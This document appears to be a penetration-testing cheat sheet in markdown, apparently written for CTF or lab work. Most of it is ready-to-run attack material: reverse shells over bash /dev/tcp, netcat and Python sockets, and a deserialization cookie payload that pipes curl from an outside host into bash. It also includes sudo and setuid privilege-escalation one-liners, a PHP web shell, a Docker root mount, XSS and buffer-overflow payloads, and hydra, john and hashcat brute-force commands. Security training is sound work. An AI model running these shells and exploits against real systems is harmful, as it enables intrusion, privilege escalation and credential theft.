## 🔒 Encryption

```gpg --import key``` : Import the gpg key inside the gpg-agent \
```gpg message.gpg``` : Decrypt the message with the key loaded in gpg-agent

## 🪄 Steg

```steghide extract -sf``` : Extract secret from ordinary looking file

## 🪝 Enumeration

- Black Box Enumeration routine
  - Nmap : To find open port and list services
  - Gobuster & ffuf : On web service to find interesting files

- Enumeration routine (after getting access)
  - id : list uig and gid and look for interesting group perm (docker, lxc, ...)
  - sudo -l : check if logged user can use sudo
  - sudo -v : look for CVE (sudo version < 1.8 is vulnerable)
  - kernel version : look for CVE
  - find : look for files with setuid or setgid bit set (4000)
  - crontab : look for user or root cron
  - sniff around local user file : (pay attention to hidden files)
  - crawl user environment : (env variable, path, ...)
  - list processus
  - list services
  - look for services files (/var/www/html, /opt, ...)
  
- Useful commands

```find / type -f -user root -perm -u=s 2> /dev/null``` : Look for setUID program \
```find / -perm /4000 2> /dev/null``` : Look for setUID program \
```getcap -r / 2>/dev/null```

- Useful links
  - https://gtfobins.github.io/
  - https://book.hacktricks.xyz/welcome/readme
  - https://www.thehacker.recipes/
  - https://www.exploit-db.com/
  - https://gchq.github.io/CyberChef/

## ⚓ Privileges Escalation

- Using python

```python3 -c 'import pty;pty.spawn("/bin/bash")'``` : ``pty`` python spawner (used for ``su``) \
```python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'``` : Python priv esc sniper

- Using sudo

```sudo find file -exec cat /root/root.txt \;``` : Dump restricted file content to standard output using ``find`` and ``exec``\
```sudo -u \#$((0xffffffff)) /bin/bash``` : Run ``/bin/bash`` using run as all sudo exploit \
```sudo vim -c ':!/bin/sh'``` : Shell exploit with ```vim```

- Using perl

```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'``` : Require ```/usr/bin/perl = cap_setuid+ep```

- Using php

```<?php system($_GET['cmd']);?>``` : Shell exploit with some PHP

## 🐚 Reverse Shell

- Using tcp/udp

```/bin/bash -i > /dev/tcp/10.10.10.10/8000 0>&1 2>&1``` : ``tcp`` based reverse shell \
```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.126.124 8000 >/tmp/f``` : ``tcp`` based reverse shell

- Using python

```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.5.201",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

```{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl 10.10.10.10:8000/shell.sh | bash ', function(error, stdout, stderr) { console.log(stdout) });\n }()","isAdmin":true,"encoding": "utf-8"}``` : Upload reverse shell through cookie deserialization vuln

## 📂 File Crawling

- Using gobuster

```gobuster dir -u http://10.10.177.208 -w /usr/share/wordlists/dirb/big.txt``` : Crawl web site with gobuster (require wordlist) \
```gobuster dir -u http://10.10.223.47:31331 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15-x php,html,txt -q``` : Crawl dir and file extension

- Using ffuf

```ffuf -u http://10.10.177.208 -w /usr/share/wordlists/dirb/big.txt``` : Fuzz web site with ffuf (require wordlist)

## 👁️ Nmap

```nmap -vv -p- -Pn``` : Simple wide port scanning \
```nmap -vv -sS -sV -A -T4``` : Advanced wide port scanning with SYN flag and probing service open port \
```nmap -vv -sS -min-rate 5000 -p- --open -n -Pn``` : Advanced wide port scanning with SYN flag, probing service open port and time management

- Using nping

```nping --rate=5 172.16.5.0/16``` : Fast scan entire subnet \

- Using ncat

```nc -nlvp 9999``` : Start nectcat listener on port 9999
```nc -w1 -i1 $1 22``` : Check if a port is open on remote host with nc 


## 🐘 PHP

Code snippet for static LFI attack
```
if (isset($_GET['language'])) {
    include($_GET['language']); # or include("lang_" . $_GET['language']); # or include($_GET['language'] . ".php");
}
```

## 🐳 Docker

```docker run -v /:/mnt --rm -it alpine chroot /mnt sh``` : Mount root file system in a container

## 🗃️ Sqlmap

```sqlmap -r r.txt --dbs``` : Enumarate database \
```sqlmap -r r.txt --dbs --batch -D db_name --tables``` : Enumerate db tables \
```sqlmap -r t.txt --dbs --batch -D db_name --tables -T table_name --columns -C field_name --sql-query 'select field_name from table_name'``` : Query fields

## XSS

```<script>alert("Hello World")</script>``` : Pop up alert \
```<script>alert(window.location.hostname)</script>``` : Get client ip address

## 📜 JavaScript

```
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}

app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

## 🪰 Buffer Overflow x86 ELF

```gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32``` : Compile code to make it executable

```gdb -q bow32``` : Enable debuggin of program\
```(gdb) set disassembly-flavor intel``` :  Makes the disassembled representation easier to read into gdb \
```(gdb) disas main``` : Inspect the ``main`` function into gdb\
```(gdb) info registers [eip ...]``` : Display registers informations about program into gdb \
```(gdb) x/2000xb $esp+550``` : Jump below the top of the stack 

```$(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')``` : Buffer overflow pyhton snippet

## :snake: Hydra
- Useful example

```hydra -l user -P list 10.12.56.25 ssh``` : Bruteforce password from list for ``user`` on the ``ssh`` protocol \
```hydra -l user -P list 10.12.56.25 -s 55007 pop3``` : Specify port and protocol \
```hydra -l user -P list 10.12.56.25 http-post-form "FORM" -V``` : Bruteforce web based login form

- Options

```http-post-form``` : Bruteforce for http POST method \
```http-get-form``` : Bruteforce for http GET method

```/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid``` : Form structure example

## :hocho: John The Ripper
- Useful example

```john hash --wordlist=/usr/share/wordlist/rockyou.txt``` : Mainstream example for bruteforce with wordlist\
```john hash -mask=?a?a?a?a?a?a?a?a --format=FORMAT``` : Mainstream example for bruteforce with masks

- Options

```--status``` or ```-s``` : Display attack progress\
```--show``` : Display cracked password\

## :smirk_cat: Hashcat
- Useful example

```hashcat --attack-mode 0 --hash-type 1100 HASH_FILE WORDLIST``` : Example for attacking with dictionary\
```hashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type 1000 HASH_FILE "?a?a?a?a?a?a?a?a?a?a?a?a"``` : Example for incremental bruteforce

- Modes

```0``` : Dictionary\
```3``` : Bruteforce increment

- Options

```--status``` : Display attack progress\
```--show``` : Display cracked password\
```--attack-mode``` or ```-a``` : Enable attack mode\
```--hash-type``` or ```-m``` : Select hash format\
```--increment``` or ```-i``` : Enable incremental bruteforce
- Ressources

https://hashcat.net/wiki/doku.php?id=example_hashes
